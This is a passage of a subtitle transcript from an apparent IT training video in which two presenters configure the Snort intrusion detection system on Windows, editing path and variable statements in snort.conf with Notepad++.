package was deployed.\n\n622\n00:26:33.480 --> 00:26:39.220\nIf it was in D,\nit would be D:\\snort\\etc\\snort.conf.\n\n623\n00:26:39.220 --> 00:26:41.660\nThen we're gonna do L for log, right?\n\n624\n00:26:41.660 --> 00:26:43.170\nSo do a little log in there.\n\n625\n00:26:43.170 --> 00:26:46.430\nI'm gonna specify the log for\nsnort logging.\n\n626\n00:26:46.430 --> 00:26:48.730\nThat will be snort and\n\n627\n00:26:48.730 --> 00:26:53.370\nthen forward slash log because that's\nthe default specification of the path.\n\n628\n00:26:53.370 --> 00:26:58.020\nIt was in the d drive, f drive,\nwhatever, you can just adjust that path.\n\n629\n00:26:59.030 --> 00:27:02.760\nMinus capital K, and then for\ncharacter set, ASCII.\n\n630\n00:27:02.760 --> 00:27:05.330\nProbably can figure out what\nthat's going to do for us.\n\n631\n00:27:05.330 --> 00:27:09.820\nI know we've put up in the chat\nwindow the snort.org url.\n\n632\n00:27:09.820 --> 00:27:11.240\nWe've talked about it already.\n\n633\n00:27:11.240 --> 00:27:16.430\nJust the big warning slash,\nmake sure you do this plug here.\n\n634\n00:27:16.430 --> 00:27:17.690\nYou gotta go out,\n\n635\n00:27:17.690 --> 00:27:21.650\ntake a look at the figurations\ndocumentation up on the snort website.\n\n636\n00:27:21.650 --> 00:27:25.410\nIt is not going to be rocket\nscience to set this up.\n\n637\n00:27:25.410 --> 00:27:26.770\nI don't think anybody.\n\n638\n00:27:26.770 --> 00:27:28.420\nIs gonna have any problem doing this.\n\n639\n00:27:28.420 --> 00:27:31.160\nIt is a little challenging in the\nbeginning in the sense there's just a lot\n\n640\n00:27:31.160 --> 00:27:32.310\nof different little nooks and\n\n641\n00:27:32.310 --> 00:27:34.580\ncrannies in the config file\nyou gotta go in and play with.\n\n642\n00:27:34.580 --> 00:27:38.510\nWe're gonna walk you through that now but\nother than just getting it straight and\n\n643\n00:27:38.510 --> 00:27:42.120\ntaking your time, really no big deal.\n\n644\n00:27:42.120 --> 00:27:45.340\nYes, snort.org/documents there we go.\n\n645\n00:27:45.340 --> 00:27:47.810\nGotta slow down long enough not\nto trip over my own tongue.\n\n646\n00:27:47.810 --> 00:27:52.280\nBut if you try to do this without reading\nthe config documents, you're gonna\n\n647\n00:27:52.280 --> 00:27:55.500\njust wanna put a bunch of errors, because\nyou're gonna miss a whole bunch stuff\n\n648\n00:27:55.500 --> 00:28:00.010\nthat's to be configured in the file,\nas you're gonna see in just a minute.\n\n649\n00:28:01.690 --> 00:28:03.360\nWhat's gonna happen is.\n\n650\n00:28:03.360 --> 00:28:05.710\nNow let me just run this, so\nwe have it in the buffer.\n\n651\n00:28:05.710 --> 00:28:07.300\nAnd we get the error, which is fine.\n\n652\n00:28:07.300 --> 00:28:08.120\nWe expect that.\n\n653\n00:28:08.120 --> 00:28:09.140\nNo big deal.\n\n654\n00:28:09.140 --> 00:28:10.940\nAnd we know that the fatal error is hey,\n\n655\n00:28:10.940 --> 00:28:15.340\nby the way, I'm going to use to launch\nall this stuff, and it doesn't exist.\n\n656\n00:28:15.340 --> 00:28:19.210\nIf we actually look at the last line,\nright above fatal error quitting where it\n\n657\n00:28:19.210 --> 00:28:23.810\nsays could not start dynamic module path,\nopen cloak for path statement, folk slash\n\n658\n00:28:23.810 --> 00:28:28.690\nuser directory local lib snort dynamic\nprocessor or dynamic pre-processor.\n\n659\n00:28:28.690 --> 00:28:33.060\nWe're gonna modify that path statement in\nthe confile and actually configure it.\n\n660\n00:28:33.060 --> 00:28:35.160\nBut that, among others,\nis gonna be about five or\n\n661\n00:28:35.160 --> 00:28:38.400\nsix other things we gotta do,\nare not gonna be set up the right way.\n\n662\n00:28:38.400 --> 00:28:39.780\nAnd we're gonna have to go in and\nedit this.\n\n663\n00:28:39.780 --> 00:28:43.580\nSo we're gonna create some changes,\nor make some changes, rather,\n\n664\n00:28:43.580 --> 00:28:44.550\nin the conf file.\n\n665\n00:28:44.550 --> 00:28:47.290\nAnd once we do this we're then\ngonna be able to run snort.\n\n666\n00:28:47.290 --> 00:28:50.970\nNow you do have to understand that this\nwill on average first time you do it,\n\n667\n00:28:50.970 --> 00:28:54.190\nit could take you 20 to 30 minutes\nto read through the documentation.\n\n668\n00:28:54.190 --> 00:28:56.040\nKind of go line by line.\n\n669\n00:28:56.040 --> 00:28:58.660\nGo back and forth between the document and\nthe con file.\n\n670\n00:28:58.660 --> 00:29:01.420\nI'm gonna make a recommendation\nto you that's gonna help you\n\n671\n00:29:01.420 --> 00:29:03.830\nwhich is make a copy of the con file.\n\n672\n00:29:03.830 --> 00:29:08.110\nIf we have separate notes, probably\na little hard to see on the desktop, but\n\n673\n00:29:08.110 --> 00:29:11.230\nI'll this highlighted right over here and\ncircled around it.\n\n674\n00:29:11.230 --> 00:29:15.780\nI copied the compile out before we glen\nin or about to go and start editing, but\n\n675\n00:29:15.780 --> 00:29:17.920\nit actually got opened, in Notepad.\n\n676\n00:29:17.920 --> 00:29:19.110\nBut I've copied it, so\n\n677\n00:29:19.110 --> 00:29:22.490\nthat way if anything goes wrong\nyou can always replace the file.\n\n678\n00:29:22.490 --> 00:29:24.960\nCuz you know, listen,\nyou're gonna make a mistake at some point.\n\n679\n00:29:24.960 --> 00:29:26.160\nNo big deal.\n\n680\n00:29:26.160 --> 00:29:27.190\nNot the end of the world.\n\n681\n00:29:27.190 --> 00:29:30.210\nBut you do wanna know that\nyou could have an issue.\n\n682\n00:29:30.210 --> 00:29:32.800\nSo it's always good to have that and\njust make a backup of that.\n\n683\n00:29:32.800 --> 00:29:35.460\nYou can always go out on the web and\nfind another one and dump it back in, but\n\n684\n00:29:35.460 --> 00:29:38.020\nyou know It's always a problem you'd\nhave to deal with those things.\n\n685\n00:29:38.020 --> 00:29:39.090\nJust make it easier.\n\n686\n00:29:39.090 --> 00:29:41.730\nAll right, so let's just open Notepad++.\n\n687\n00:29:41.730 --> 00:29:46.500\nI've got that opened up, nice bright and\nbold and big beautiful text in there.\n\n688\n00:29:46.500 --> 00:29:50.170\nAnd what we're gonna do is,\nI've already opened the Snort.com files.\n\n689\n00:29:50.170 --> 00:29:52.940\nSo I've just gone in right\nto the path to get it.\n\n690\n00:29:52.940 --> 00:30:00.340\nSo I've gone in and in Notepad++ I've\ngone into the snort etsy file.\n\n691\n00:30:00.340 --> 00:30:04.650\nSo snort and the etsy or ETC directory and\n\n692\n00:30:04.650 --> 00:30:09.140\nI've just opened up snorf.com, c n o f And\nI've just brought the file in.\n\n693\n00:30:09.140 --> 00:30:12.190\nAnd so now that I have it in there,\nwhat we're gonna do is we're gonna go in,\n\n694\n00:30:12.190 --> 00:30:16.170\nand we're gonna start searching and\nreplacing for various things, right?\n\n695\n00:30:16.170 --> 00:30:20.450\nFinding and replacing, or searching and\nmodifying configuration values.\n\n696\n00:30:20.450 --> 00:30:25.250\nSo We're gonna go in here to the search\nmenu and we're gonna go, gonna come about,\n\n697\n00:30:25.250 --> 00:30:26.400\nooh, half way down.\n\n698\n00:30:26.400 --> 00:30:28.320\nDo a little search and replace.\n\n699\n00:30:28.320 --> 00:30:31.120\nAnd what we're gonna do there\nis we're gonna go in and\n\n700\n00:30:31.120 --> 00:30:35.610\nwe're gonna look for\nthe first statement which is ip var.\n\n701\n00:30:35.610 --> 00:30:40.500\nSo we're looking for statement in\nthe file Ipvar, which is IP variable,\n\n702\n00:30:40.500 --> 00:30:44.570\nand we're going to then replace\nthat with variable, just with var.\n\n703\n00:30:44.570 --> 00:30:48.120\nSo we're going to remove the IP\nreference in the beginning of that,\n\n704\n00:30:48.120 --> 00:30:51.405\nand we're going to do every\ninstance that we find in there.\n\n705\n00:30:51.405 --> 00:30:54.395\nSo we're gonna do ipvar at the top,\nand then we're gonna do var.\n\n706\n00:30:54.395 --> 00:30:55.315\nLet's move this up here,\n\n707\n00:30:55.315 --> 00:30:57.925\nso we're kinda out of the way\nof the main body of the text.\n\n708\n00:30:57.925 --> 00:31:00.005\nJust make it a little bit easier for\neverybody to see.\n\n709\n00:31:00.005 --> 00:31:02.585\nAnd so we're gonna go in, and\nwe're gonna hit the third button down.\n\n710\n00:31:02.585 --> 00:31:03.435\nIt says replace all.\n\n711\n00:31:03.435 --> 00:31:04.560\nI know it's a little small.\n\n712\n00:31:04.560 --> 00:31:05.600\nMaybe a little hard to see that.\n\n713\n00:31:05.600 --> 00:31:08.100\nBut we're gonna do that,\nit's gonna run through.\n\n714\n00:31:08.100 --> 00:31:10.880\nAnd we're gonna get 11 instances\ndown at the bottom there.\n\n715\n00:31:10.880 --> 00:31:12.800\nI'm kinda pointing to it, in blue.\n\n716\n00:31:12.800 --> 00:31:16.000\nIt tells you how many instances\nit finds and replaces for you.\n\n717\n00:31:16.000 --> 00:31:18.540\nSo 11 occurrences, we're done.\n\n718\n00:31:18.540 --> 00:31:21.390\nNow we're gonna go in and\nwe're gonna continue.\n\n719\n00:31:21.390 --> 00:31:25.010\nNow, the first thing we did Is essentially\njust replace that statement, so\n\n720\n00:31:25.010 --> 00:31:27.090\nthat we can now have\neverything read that var for\n\n721\n00:31:27.090 --> 00:31:29.430\nvariable and\nnow we're gonna modify some variables.\n\n722\n00:31:29.430 --> 00:31:30.990\nSo we're gonna go ahead\nwe're gonna do that.\n\n723\n00:31:30.990 --> 00:31:33.680\nSo let's go in and let's do a find.\n\n724\n00:31:33.680 --> 00:31:39.110\nSo we'll just go up here to search instead\nfind and replace We'll just do a find.\n\n725\n00:31:39.110 --> 00:31:40.600\nSo we'll go in and do that.\n\n726\n00:31:40.600 --> 00:31:44.990\nAnd on the find we're going to go in and\nwe're going to type in the following.\n\n727\n00:31:44.990 --> 00:31:46.940\nLet me just get rid of what is there.\n\n728\n00:31:46.940 --> 00:31:52.550\nAnd we'll do dynamic pre Processor.\n\n729\n00:31:52.550 --> 00:31:56.150\nAnd you need to got to be careful\nwith the spelling on this.\n\n730\n00:31:56.150 --> 00:31:59.871\nAgain, I know, it's kind of small in\nthe window to see what I'm typing.\n\n731\n00:31:59.871 --> 00:32:03.887\nAll the documentation that might pointed\nyou to on the chat window that we're\n\n732\n00:32:03.887 --> 00:32:06.373\ntalking about snort.orgfolks/documents.\n\n733\n00:32:06.373 --> 00:32:09.188\nRead the config, document will tell you.\n\n734\n00:32:09.188 --> 00:32:12.227\nAll the directories to look at and\nthe stuff to go into there.\n\n735\n00:32:12.227 --> 00:32:17.020\nSo this is dynamic preprocessor,\nall one string, all one word together.\n\n736\n00:32:17.020 --> 00:32:19.790\nObviously, I gotta spell that carefully,\nright?\n\n737\n00:32:19.790 --> 00:32:22.450\nAnd then space, and the word directory.\n\n738\n00:32:22.450 --> 00:32:26.560\nSo we're looking for\ndynamic preprocessor directory.\n\n739\n00:32:26.560 --> 00:32:29.860\nSo we wanna find that, so\nwe're gonna go do Find Next.\n\n740\n00:32:29.860 --> 00:32:33.100\nAnd assuming we spelled it correctly,\nyou can now see it highlighted\n\n741\n00:32:33.100 --> 00:32:35.550\nin the left in gray, so\nyou can see what I was searching for.\n\n742\n00:32:35.550 --> 00:32:38.010\nReal easy to see it there,\nright, nice and big.\n\n743\n00:32:38.010 --> 00:32:39.230\n&gt;&gt; Right.\n\n744\n00:32:39.230 --> 00:32:42.490\n&gt;&gt; And so now that we can see that,\nwhat we're gonna do there\n\n745\n00:32:42.490 --> 00:32:46.720\nis we're gonna go ahead and we're going\nto make a little change there, right?\n\n746\n00:32:46.720 --> 00:32:51.270\nSo where to locate that line, so\nwe see it's line 247 in Noptepad++.\n\n747\n00:32:51.270 --> 00:32:54.640\nThe nice thing about Notepad++,\none of the main reason\n\n748\n00:32:54.640 --> 00:32:59.030\nwe're using it as an IDE editor is that\nit does give us the line numbers, right?\n\n749\n00:32:59.030 --> 00:33:00.110\n&gt;&gt; Right.\n&gt;&gt; So, it's kind of nice.\n\n750\n00:33:00.110 --> 00:33:02.240\nOtherwise I coud say it's about\nhalfway down in Notepad, right?\n\n751\n00:33:02.240 --> 00:33:04.420\nWe wouldn't be able to know exactly where.\n\n752\n00:33:04.420 --> 00:33:06.960\n&gt;&gt; And another thing I'd love to point out\ntoo is that while you're typing out and\n\n753\n00:33:06.960 --> 00:33:10.410\nfinding that is just the fact that you're\nusing the find and the find and replace.\n\n754\n00:33:10.410 --> 00:33:12.670\nI think it's one of those things\nthat people forget about.\n\n755\n00:33:12.670 --> 00:33:16.600\nAnd they try to go line by line\nby line looking for IP VAR.\n\n756\n00:33:16.600 --> 00:33:17.360\n&gt;&gt; Yeah, good luck with that.\n\n757\n00:33:17.360 --> 00:33:20.260\n&gt;&gt; To replace with VAR and\nyou miss one instance, and it's so\n\n758\n00:33:20.260 --> 00:33:23.530\neasy to go when you got hundreds of lines\ncodes because where built into the tools,\n\n759\n00:33:23.530 --> 00:33:27.300\nmost of those word processing tools\nhave a simple find and replace.\n\n760\n00:33:27.300 --> 00:33:27.820\n&gt;&gt; They do.\n&gt;&gt; It makes\n\n761\n00:33:27.820 --> 00:33:28.320\nthem-\n&gt;&gt; Even Notepad.\n\n762\n00:33:28.320 --> 00:33:29.170\n&gt;&gt; So much more efficient.\n\n763\n00:33:29.170 --> 00:33:30.250\n&gt;&gt; Even Notepad.\n&gt;&gt; Yeah, yeah.\n\n764\n00:33:30.250 --> 00:33:33.380\nAnd when you do the replace and\nif you you might find every instance, but\n\n765\n00:33:33.380 --> 00:33:36.270\nyou make one little type of\nreplacing it and, yeah so\n\n766\n00:33:36.270 --> 00:33:38.150\nit's, it's really nice tip-\n&gt;&gt; Yeah.\n\n767\n00:33:38.150 --> 00:33:39.890\n&gt;&gt; To remember to look for\nthose in those tools.\n\n768\n00:33:39.890 --> 00:33:42.230\n&gt;&gt; Now instead of Snort.coffee,\nI have Snort.out of luck.\n\n769\n00:33:42.230 --> 00:33:43.526\n&gt;&gt; Yeah.\n&gt;&gt; It's not gonna work\n\n770\n00:33:43.526 --> 00:33:44.370\n&gt;&gt; So that's important.\n\n771\n00:33:44.370 --> 00:33:47.292\nNow I just wanna point out something\nelse just about the behavior of\n\n772\n00:33:47.292 --> 00:33:48.342\nthe Notepad++ tool.\n\n773\n00:33:48.342 --> 00:33:50.923\nIf haven't used it before or\nyou are not familiar with it,\n\n774\n00:33:50.923 --> 00:33:54.364\nif you notice I've clicked, I've found\nthe line I'm looking for, right?\n\n775\n00:33:54.364 --> 00:33:58.253\nAnd so I clicked on the line it's now\nkind of a white-ish,grey-ish,blue-ish,\n\n776\n00:33:58.253 --> 00:34:00.870\nI don't know,\nwhatever you'd can that, indigo.\n\n777\n00:34:00.870 --> 00:34:03.090\nWhatever color that is, but\nit's kind of a washed out blue,\n\n778\n00:34:03.090 --> 00:34:04.760\nwe're gonna go edit that in a minute.\n\n779\n00:34:04.760 --> 00:34:07.550\nBut you'll notice that when I\ndid that the find, find next,\n\n780\n00:34:07.550 --> 00:34:10.830\nfind replace box is kind of shadowed and\ngrayed out right now.\n\n781\n00:34:10.830 --> 00:34:12.079\nAnd that's expected behavior.\n\n782\n00:34:12.079 --> 00:34:15.390\nIt does that so you can actually see,\nwhich I like about the tool because\n\n783\n00:34:15.390 --> 00:34:18.480\nnow you can edit behind it, and\nyou see how it's kind of shadowed in gray?\n\n784\n00:34:18.480 --> 00:34:19.540\n&gt;&gt; That transparency too, yeah.\n\n785\n00:34:19.540 --> 00:34:22.134\n&gt;&gt; Yeah, so it's kind of nice and\nit does that automatically for you,\n\n786\n00:34:22.134 --> 00:34:23.193\nwhich is also pretty cool.\n\n787\n00:34:23.193 --> 00:34:26.804\nSo just calling that out in case you're\nwondering, you think you're seeing things,\n\n788\n00:34:26.804 --> 00:34:28.930\nit's been a long night,\nnot enough Mountain Dew,\n\n789\n00:34:28.930 --> 00:34:30.380\nand the eye's start going on you.\n\n790\n00:34:30.380 --> 00:34:33.428\nThat can get a little freaky,\nso that's expected behavior.\n\n791\n00:34:33.428 --> 00:34:37.862\nAll right, so we're gonna go ahead, we\nfound the dynamic preprocessor directory\n\n792\n00:34:37.862 --> 00:34:41.770\nline we're going to modify this path\nstatement that starts with /usr.\n\n793\n00:34:41.770 --> 00:34:44.550\nThis is one of those arrows that I\nshowed you when we went to run it\n\n794\n00:34:44.550 --> 00:34:48.350\nbecause it doesn't understand the path,\nbecause this path doesn't exist.\n\n795\n00:34:48.350 --> 00:34:50.200\nSo we've got to modify it.\n\n796\n00:34:50.200 --> 00:34:51.479\nSo we're gonna go and we're gonna do that.\n\n797\n00:34:51.479 --> 00:34:52.432\nWe're gonna change that.\n\n798\n00:34:52.432 --> 00:34:54.660\nWe're gonna make it read c snort and\n\n799\n00:34:54.660 --> 00:34:57.640\nthe directory path that we've\ncreated when we installed locally.\n\n800\n00:34:57.640 --> 00:34:58.890\nSo I'm gonna highlight this.\n\n801\n00:34:58.890 --> 00:35:04.590\nYou can see me starting to highlight,\nand what I'm gonna do is the following.\n\n802\n00:35:04.590 --> 00:35:12.060\nI'm gonna do c: and\nI'm gonna do /snort and then back slash.\n\n803\n00:35:12.060 --> 00:35:16.360\nI left lib in place already,\ncuz lib is supposed to be there.\n\n804\n00:35:16.360 --> 00:35:19.890\nAnd then what I'm simply gonna\ndo is I'm gonna go change that\n\n805\n00:35:19.890 --> 00:35:22.570\nforward slash to a back slash after lib.\n\n806\n00:35:22.570 --> 00:35:26.610\nSo you can see it's now\nsnort_dynamicpreprocessor cuz that's how\n\n807\n00:35:26.610 --> 00:35:29.980\nit's supposed to be, and I'm just\ngonna go to the end of that line and\n\n808\n00:35:29.980 --> 00:35:33.060\nI'm gonna get rid of\nthat forward slash and\n\n809\n00:35:33.060 --> 00:35:39.485\njust leave it as dynamicpreprocessor with\nno directory or subdirectory listings.\n\n810\n00:35:39.485 --> 00:35:41.695\nWe're not drilling in right?\n\n811\n00:35:41.695 --> 00:35:45.925\nAnd so we can see now it reads\ndynamicpreprocessor directory and\n\n812\n00:35:45.925 --> 00:35:53.630\nthen the past statement\nC:\\snort\\lib\\snort_dynamicpreprocessor.\n\n813\n00:35:53.630 --> 00:35:56.480\nNow, you'd just check this real quick,\nif we go here.\n\n814\n00:35:58.130 --> 00:36:01.890\nI'm in Snort, and\nyou can see I'm in Snort.\n\n815\n00:36:01.890 --> 00:36:03.740\nI'll go to lib here.\n\n816\n00:36:03.740 --> 00:36:07.805\nAnd in lib,\nI have dynamic preprocessor right there,\n\n817\n00:36:07.805 --> 00:36:10.880\nsnort_dynamicpreprocessor right there.\n\n818\n00:36:10.880 --> 00:36:14.430\nAnd so I can see it, and\nI can see that that path exists, right?\n\n819\n00:36:14.430 --> 00:36:16.950\nSo just want to make\nsure we're aware of that.\n\n820\n00:36:16.950 --> 00:36:18.060\nAnd so that's there.\n\n821\n00:36:18.060 --> 00:36:21.860\nAnd so I'm just going to start\nmodifying all these statements as I go\n\n822\n00:36:21.860 --> 00:36:23.730\nto get Snort configured so\n\n823\n00:36:23.730 --> 00:36:27.710\nthat it is gonna work when we go to\nlaunch it with that command again.\n\n824\n00:36:27.710 --> 00:36:29.300\nThis time it will actually configure.\n\n825\n00:36:29.300 --> 00:36:34.310\nWe're going to use a second command first\nto check the config with a -T on the end,\n\n826\n00:36:34.310 --> 00:36:36.950\nverify the config,\nmake sure we don't have any errors there.\n\n827\n00:36:36.950 --> 00:36:39.280\nWe don't have to do that, we just go\nahead and jump right in and load it.\n\n828\n00:36:39.280 --> 00:36:41.730\nBut if there is an error,\nit'll kick it out and tell us.\n\n829\n00:36:41.730 --> 00:36:44.890\nThe nice thing is, it'll tell us what\nthe error is by parsing the file.\n\n830\n00:36:44.890 --> 00:36:47.100\nSo we can go line by line,\nfixing the errors.\n\n831\n00:36:47.100 --> 00:36:49.080\nAnd then, when we get to the bottom,\nwe know it's going to run.\n\n832\n00:36:49.080 --> 00:36:51.560\nIt gives us an all thumbs up smiley face.\n\n833\n00:36:51.560 --> 00:36:53.350\nWe can actually modify that.\n\n834\n00:36:53.350 --> 00:36:57.340\nWe can make it a picture\nof somebody smiling, right?\n\n835\n00:36:57.340 --> 00:36:58.630\n&gt;&gt; Yeah.\n&gt;&gt; So we could actually put Mr.\n\n836\n00:36:58.630 --> 00:36:59.140\nHappy over there.\n\n837\n00:36:59.140 --> 00:37:00.290\n&gt;&gt; Could we put Mr. Titus on there?\n\n838\n00:37:00.290 --> 00:37:03.370\n&gt;&gt; We could put Mr.\nTitus's smiling face in there, and\n\n839\n00:37:03.370 --> 00:37:06.210\nhe could be doing the thumbs up and\nwe could have the tag line.\n\n840\n00:37:06.210 --> 00:37:07.160\nI did my best.\n\n841\n00:37:07.160 --> 00:37:09.050\n&gt;&gt; Yeah.\n&gt;&gt; And that would work, we could do that.\n\n842\n00:37:09.050 --> 00:37:11.790\nSo we'll go through and\nwe'll show you that.\n\n843\n00:37:11.790 --> 00:37:14.100\nWe won't have the smiling Titus\nface in there, that won't happen.\n\n844\n00:37:14.100 --> 00:37:17.330\nBut we'll come from the blooper\nreal on that one, all right.\n\n845\n00:37:17.330 --> 00:37:18.860\nWe can add that in.\n\n846\n00:37:18.860 --> 00:37:20.190\nSo what we're gonna do is\nwe're gonna go in now.\n\n847\n00:37:20.190 --> 00:37:21.760\nWe're gonna go do another edit here,\nright?\n\n848\n00:37:21.760 --> 00:37:24.240\nSo we're gonna just continue\nwalking through the file.\n\n849\n00:37:24.240 --> 00:37:27.050\nIt's about six or\nseven areas we gotta go through and edit.\n\n850\n00:37:27.050 --> 00:37:29.110\nSo what we're gonna do is go find.\n\n851\n00:37:29.110 --> 00:37:31.220\nSo let's just click Back on the box here.\n\n852\n00:37:31.220 --> 00:37:33.140\nAnd believe it or not,\nit does actually become active again.\n\n853\n00:37:33.140 --> 00:37:34.550\nIt's real simple to do.\n\n854\n00:37:34.550 --> 00:37:36.680\nNow another suggestion, just for\n\n855\n00:37:36.680 --> 00:37:40.670\nwhat it's worth, that I'm going\nto I'm gonna recommend to you.\n\n856\n00:37:40.670 --> 00:37:42.500\nI told you to copy the snort.com file.\n\n857\n00:37:42.500 --> 00:37:44.410\nMake sure you have a backup of it.\n\n858\n00:37:44.410 --> 00:37:47.350\nI'm also gonna recommend that\nyou save as you go here, right?\n\n859\n00:37:47.350 --> 00:37:50.870\nBecause if anything goes wrong,\nand you make a change, and\n\n860\n00:37:50.870 --> 00:37:53.480\nmaybe you screw something up halfway\nthrough, and you're like, God.\n\n861\n00:37:53.480 --> 00:37:56.200\nHave I gotta go in and no,\nI got to fix some, you start over.\n\n862\n00:37:56.200 --> 00:37:59.560\nYou don't have the last chain is and\nso, obviously as you go,\n\n863\n00:37:59.560 --> 00:38:00.608\nyou probably don't wanna save.\n\n864\n00:38:00.608 --> 00:38:04.920\nSo we're just gonna go up and\nhit the little floppy disk up there,\n\n865\n00:38:04.920 --> 00:38:06.220\nuniversal save, right?\n\n866\n00:38:06.220 --> 00:38:08.100\n&gt;&gt; Yes.\n&gt;&gt; So I'm gonna save that as we go.\n\n867\n00:38:08.100 --> 00:38:10.497\nSo I've just saved the first entry, right?\n\n868\n00:38:10.497 --> 00:38:13.093\nWe're gonna just keep saving as we go,\n\n869\n00:38:13.093 --> 00:38:17.670\nmaking sure we don't have to go back and\nredo anything, obviously.\n\n870\n00:38:17.670 --> 00:38:20.035\nYou wanna save a little time and\nenergy, if possible there.\n\n871\n00:38:20.035 --> 00:38:20.800\n&gt;&gt; Mm-hm.\n&gt;&gt; All right, so\n\n872\n00:38:20.800 --> 00:38:25.750\nlet's go through its Find, and in this\ncase, let's get rid of what's in there.\n\n873\n00:38:25.750 --> 00:38:26.690\nHold on one second.\n\n874\n00:38:28.300 --> 00:38:29.050\nJust get rid of that.\n\n875\n00:38:29.050 --> 00:38:33.160\nAnd what were gonna do is now go in and\nwere gonna search for\n\n876\n00:38:33.160 --> 00:38:38.539\nthe following path to dynamic\n\n877\n00:38:38.539 --> 00:38:42.980\nrules, libraries, little hashtag there.\n\n878\n00:38:42.980 --> 00:38:47.860\nI'm gonna look for\nthe REM statement that is gonna be listed.\n\n879\n00:38:47.860 --> 00:38:52.080\nYou can see it's right near where we were,\nright, so down there.\n\n880\n00:38:52.080 --> 00:38:53.930\nSo we're gonna go down,\nwe're gonna scroll.\n\n881\n00:38:53.930 --> 00:38:56.080\nAnd we're gonna find that or\njust move that out of the way, or\n\n882\n00:38:56.080 --> 00:38:57.580\nwhatever we need to do.\n\n883\n00:38:57.580 --> 00:39:01.580\nAnd what we're gonna do is we're\ngoing to go in and modify this thing.\n\n884\n00:39:01.580 --> 00:39:04.541\nSo let's just move this up just a touch so\nwe can see that,\n\n885\n00:39:04.541 --> 00:39:07.959\nwe've got our path to dynamic\nrules libraries with the hashtag.\n\n886\n00:39:07.959 --> 00:39:10.685\nI search for this entire string in grey,\njust to be clear so\n\n887\n00:39:10.685 --> 00:39:12.308\nyou know what we're looking for.\n\n888\n00:39:12.308 --> 00:39:16.649\nWe then get dynamicdetection directory,\nand again, another path that's not\n\n889\n00:39:16.649 --> 00:39:21.660\nthe appropriate path because it's the user\npath, right, from the standard install.\n\n890\n00:39:21.660 --> 00:39:25.424\nAnd so just like we did up top here\nwith dynamic reprocessor libraries and\n\n891\n00:39:25.424 --> 00:39:29.805\nsee snort live snort, dynamic reprocessor,\nwe're gonna modify this one out, and\n\n892\n00:39:29.805 --> 00:39:34.208\nwe're gonna go in, and we're gonna take\nthis, so we're gonna do this right here.\n\n893\n00:39:35.748 --> 00:39:38.204\nAnd we're gonna highlight this.\n\n894\n00:39:38.204 --> 00:39:44.538\nAnd let's just go in, like we did,\nand we'll do C:\\snort.\n\n895\n00:39:44.538 --> 00:39:49.023\nAnd now we're gonna do backspace or\nback slash rather, excuse me,\n\n896\n00:39:49.023 --> 00:39:52.972\nand we're gonna change that\nforward slash to a back slash.\n\n897\n00:39:52.972 --> 00:39:59.161\nSo we're gonna do\nC:\\snort\\lib\\snort_dynamicrules.\n\n898\n00:39:59.161 --> 00:40:02.690\nThere's no forward slash or back slash\nafter that path statement either.\n\n899\n00:40:02.690 --> 00:40:04.560\nSo, we're gonna leave\nthat just the way it is.\n\n900\n00:40:04.560 --> 00:40:07.074\nSo, we're gonna set that,\nmake sure we've got that.\n\n901\n00:40:07.074 --> 00:40:11.189\nNow, we're gonna go ahead and\nwe're going to follow our own advice,\n\n902\n00:40:11.189 --> 00:40:15.513\nwe're gonna save that off quick,\nwe're gonna come back up here to find,\n\n903\n00:40:15.513 --> 00:40:20.080\nwe're gonna now go in and find\nthe path to base pre processor engine.\n\n904\n00:40:20.080 --> 00:40:24.780\nSo we're just gonna go there,\nwe're gonna do again a hashtag.\n\n905\n00:40:24.780 --> 00:40:26.790\nThere we go,\nmake sure we got that properly.\n\n906\n00:40:26.790 --> 00:40:34.350\nAll right, path to base,\npre processor engine.\n\n907\n00:40:34.350 --> 00:40:37.170\nSo we're gonna search for that.\n\n908\n00:40:37.170 --> 00:40:38.270\nHit find next.\n\n909\n00:40:39.590 --> 00:40:40.170\nOops, hold on,\n\n910\n00:40:40.170 --> 00:40:43.770\nI did not spell that correctly,\nwhich does happen from time to time.\n\n911\n00:40:43.770 --> 00:40:45.490\n&gt;&gt; Once in a while.\n\n912\n00:40:45.490 --> 00:40:47.509\n&gt;&gt; More than you would believe, right?\n\n913\n00:40:47.509 --> 00:40:51.920\n[LAUGH] Path two, I am my own worst\nenemy when it comes to that, all right.\n\n914\n00:40:51.920 --> 00:40:54.660\nPre processor.\n\n915\n00:40:54.660 --> 00:40:57.041\n&gt;&gt; It's right above the line you're on,\nI can actually see it.\n\n916\n00:40:57.041 --> 00:40:58.737\n&gt;&gt; Engine yeah it is.\n\n917\n00:40:58.737 --> 00:41:03.520\n[CROSSTALK] We just want\nyou know to know right?\n\n918\n00:41:03.520 --> 00:41:04.101\n&gt;&gt; Yes.\n\n919\n00:41:04.101 --> 00:41:06.547\n&gt;&gt; So we can highlight just because\nthat way people can see it right and\n\n920\n00:41:06.547 --> 00:41:09.065\nknow the\n&gt;&gt; The methodology right behind\n\n921\n00:41:09.065 --> 00:41:09.570\nit\n&gt;&gt; Absolutely.\n\n922\n00:41:09.570 --> 00:41:11.550\nAnd you also never know if there's\nmore than one occurrence of that and\n\n923\n00:41:11.550 --> 00:41:12.090\nso you've gotta search.\n\n924\n00:41:12.090 --> 00:41:13.280\n&gt;&gt; Absolutely.\nIn this case there isn't.\n\n925\n00:41:13.280 --> 00:41:14.120\nThere's only one.\n\n926\n00:41:14.120 --> 00:41:15.160\nBut just to be safe.\n\n927\n00:41:15.160 --> 00:41:20.030\nAnd the reason we're also taking our time\nand really going slowly and explaining it,\n\n928\n00:41:20.030 --> 00:41:21.440\nverbalizing it all to you here,\n\n929\n00:41:21.440 --> 00:41:24.310\nwe know it's real hard to see what\nI'm typing in the find window.\n\n930\n00:41:24.310 --> 00:41:29.120\nWe were not able to modify that part\nof the font size and the screen size.\n\n931\n00:41:29.120 --> 00:41:31.130\nSo by doing at that way,\ntalking it through, and\n\n932\n00:41:31.130 --> 00:41:35.040\nthen having you see it highlighted in\nthe com font where it's big enough to see.\n\n933\n00:41:35.040 --> 00:41:37.090\nWe want you to really see what that is.\n\n934\n00:41:37.090 --> 00:41:39.270\nAnd you could see the statement\nbefore I just go in there and\n\n935\n00:41:39.270 --> 00:41:40.990\nhack away at the file and\nstart changing it.\n\n936\n00:41:40.990 --> 00:41:43.940\nSo, this way you're able\nto see it step by step.\n\n937\n00:41:43.940 --> 00:41:46.850\nSo we see path to based pre process or\nengine, right?\n\n938\n00:41:46.850 --> 00:41:47.910\nSo we can see that one there.\n\n939\n00:41:47.910 --> 00:41:50.930\nSo we're gonna go in, and\nwe're gonna change this one as well.\n\n940\n00:41:50.930 --> 00:41:57.860\nThis one is gonna be the dynamic engine\nthat we're gonna go in and 